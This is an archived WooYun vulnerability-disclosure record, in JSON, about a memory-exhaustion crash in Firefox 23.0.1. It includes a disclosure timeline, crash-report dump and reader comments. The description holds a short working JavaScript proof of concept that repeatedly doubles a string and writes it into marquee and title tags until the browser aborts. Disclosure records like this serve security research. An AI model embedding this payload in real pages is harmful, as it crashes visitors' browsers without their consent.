{"id": 7698, "wybug_id": "wooyun-2013-036684", "wybug_title": "Firefox 23.0.1处理标签内存溢出拒绝服务漏洞", "wybug_corp": "火狐浏览器", "wybug_author": "blast", "wybug_date": "2013-09-10 17:05", "wybug_open_date": "2013-12-06 17:06", "wybug_type": "拒绝服务", "wybug_level": "低", "wybug_rank_0": "4", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["拒绝服务"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-15：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-06：\t细节向公众公开  简要描述： 坑爹的是启动后恢复会话about:sessionretore那儿一碰又卡死了……D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+ xpcom_runtime_abort(###!!! ABORT: OOM: file e:\\builds\\moz2_slave\\rel-m-rel-w32_bld-000000000000\\build\\xpcom\\string\\src\\nsTSubstring.cpp, line 533)Debug String:(JavaScript Error: \"allocation size overflow\", Line 5) 详细说明：  <script>function A(){  var buffer = '\\xFF';for(i=0;i<26;i++)  //<==崩不掉稍微改大点也可以，我这儿21左右就能崩溃了{buffer+=buffer+'\\xFF'+'\\xFC';document.write('<marquee><title>'+buffer+buffer);}  }A();</script>我猜是渲染的那几次GlobalAlloc弄的?   漏洞证明：  挂之前的（19次循环），这时候基本已经快跑到外面来了：\n\n\n\n再开会话\n\nAdapterDeviceID: 0x0847AdapterVendorID: 0x10deAdd-ons: %7B9c51bd27-6ed8-4000-a2bf-36cb95c0c947%7D:11.0.1,fiddlerhook%40fiddler2.com:2.4.4.5,layoutPlan%40mozillaonline.com:1.0.2,%7Bea2b95c2-9be8-48ed-bdd1-5fcd2ad0ff99%7D:0.3.8.2,tabimprovelite%40mozillaonline.com:1.7.23.1,firegestures%40xuldev.org:1.7.10,coba%40mozilla.com.cn:1.0.15,cpmanager%40mozillaonline.com:1.0.4,%7B972ce4c6-7e08-4474-a285-3208198ce6fd%7D:23.0.1,jid1-2B1RkgHEZ0DcWA%40jetpack:0.2.1,firebug%40software.joehewitt.com:1.12.1AvailablePageFile: 2052677632AvailablePhysicalMemory: 711258112AvailableVirtualMemory: 1816576000BuildID: 20130814063812CrashTime: 1378803057EMCheckCompatibility: trueInstallTime: 1376813623Notes: AdapterVendorID: 0x10de, AdapterDeviceID: 0x0847, AdapterSubsysID: 3665103c, AdapterDriverVersion: 9.18.13.1422D2D? D2D+ DWrite? DWrite+ D3D10 Layers? D3D10 Layers+ OOMAllocationSize: 402653208ProductID: {ec8030f7-c20a-464f-9b0e-13a3a9e97384}ProductName: FirefoxReleaseChannel: releaseSecondsSinceLastCrash: 365StartupTime: 1378803051SystemMemoryUsePercentage: 82Theme: classic/1.0Throttleable: 1TotalVirtualMemory: 4294836224URL: about:blankVendor: MozillaVersion: 23.0.1Winsock_LSP: MSAFD Tcpip [TCP/IP] : 2 : 1 : %SystemRoot%\\system32\\mswsock.dll  MSAFD Tcpip [UDP/IP] : 2 : 2 :   MSAFD Tcpip [RAW/IP] : 2 : 3 : %SystemRoot%\\system32\\mswsock.dll  MSAFD Tcpip [TCP/IPv6] : 2 : 1 :   MSAFD Tcpip [UDP/IPv6] : 2 : 2 : %SystemRoot%\\system32\\mswsock.dll  MSAFD Tcpip [RAW/IPv6] : 2 : 3 :   RSVP TCPv6 服务提供商 : 2 : 1 : %SystemRoot%\\system32\\mswsock.dll  RSVP TCP 服务提供商 : 2 : 1 :   RSVP UDPv6 服务提供商 : 2 : 2 : %SystemRoot%\\system32\\mswsock.dll  RSVP UDP 服务提供商 : 2 : 2 :   VMCI sockets DGRAM : 0 : 2 : %windir%\\system32\\vsocklib.dll  VMCI sockets STREAM : 0 : 1 : 此报告同时包含了应用程序崩溃时状态的技术信息。   修复方案：  这个…看你们的了…   版权声明：转载请注明来源 blast@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-12-06 17:06 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-10 17:44 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  10w$    \n     2013-09-10 18:17 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  @Master 额 还木有到拿这奖金的严重程度 貌似只是单单因为火狐没计算好内存分配……40个标签居然把内存分配完了 然后就崩溃了-。-    \n     2013-09-11 09:27 |    \t\tblast \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:57        | 五仁委员会)\t\t \n  [误导向]用第六感看了下 貌似是前面分配的内存会在最后统一释放 但是转为格式化后的数据的时候占用空间太大 导致最后几次分配失败 然后报错触发了BugReport    \n     2013-12-06 17:17 |    \t\t小震 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | ~)\t\t \n  我操= =我以为这类开源软件都很完美的说。。    \n     2014-03-11 07:26 |    \t\t杀戮 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:19        | 我，是来打酱油的。)\t\t \n  @blast 火狐崩溃的漏洞是不给奖金的     \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}